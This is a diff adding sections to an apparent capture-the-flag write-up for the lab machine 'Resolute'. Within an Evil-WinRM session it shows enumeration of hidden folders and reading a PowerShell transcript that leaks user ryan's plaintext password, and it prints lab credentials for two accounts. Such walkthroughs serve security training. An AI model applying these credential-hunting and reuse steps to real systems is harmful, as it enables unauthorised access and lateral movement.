@@ -324,6 +324,7 @@ Using the credentials `melanie:Welcome123!`, a WinRM session was successfully es
 
 ---
 # Shell as ryan
+## enumeration
 ```
 *Evil-WinRM* PS C:\> whoami /priv
 
@@ -355,4 +356,61 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 Resolute
 ```
 
-Basic 
+Basic enumeration was performed using tools and commands such as `whoami /priv`, `tasklist`, and WinPEAS, but nothing of interest was found.
+
+---
+## Hidden Directory
+```
+Evil-WinRM* PS C:\> ls -force
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
+d--hsl        9/25/2019  10:17 AM                Documents and Settings
+d-----        9/25/2019   6:19 AM                PerfLogs
+d-r---        9/25/2019  12:39 PM                Program Files
+d-----       11/20/2016   6:36 PM                Program Files (x86)
+d--h--        9/25/2019  10:48 AM                ProgramData
+d--h--        12/3/2019   6:32 AM                PSTranscripts
+d--hs-        9/25/2019  10:17 AM                Recovery
+d--hs-        9/25/2019   6:25 AM                System Volume Information
+d-r---        12/4/2019   2:46 AM                Users
+d-----        12/4/2019   5:15 AM                Windows
+-arhs-       11/20/2016   5:59 PM         389408 bootmgr
+-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
+-a-hs-        11/4/2026   5:58 AM      402653184 pagefile.sys
+
+*Evil-WinRM* PS C:\PSTranscripts> ls -force
+
+
+    Directory: C:\PSTranscripts
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--h--        12/3/2019   6:45 AM                20191203
+
+
+*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
+*Evil-WinRM* PS C:\PSTranscripts\20191203> ls -force
+
+
+    Directory: C:\PSTranscripts\20191203
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+
+
+*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+...
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+```
+
+<img width="767" height="384" alt="image" src="https://github.com/user-attachments/assets/5949ecd0-6d3e-4555-a8db-4528e8b2c87e" />
+After basic enumeration revealed nothing of interest, the `C:\` directory was checked. An unusual directory named `PSTranscripts` was found, which contained the password `Serv3r4Admin4cc123!` for the user `ryan`.
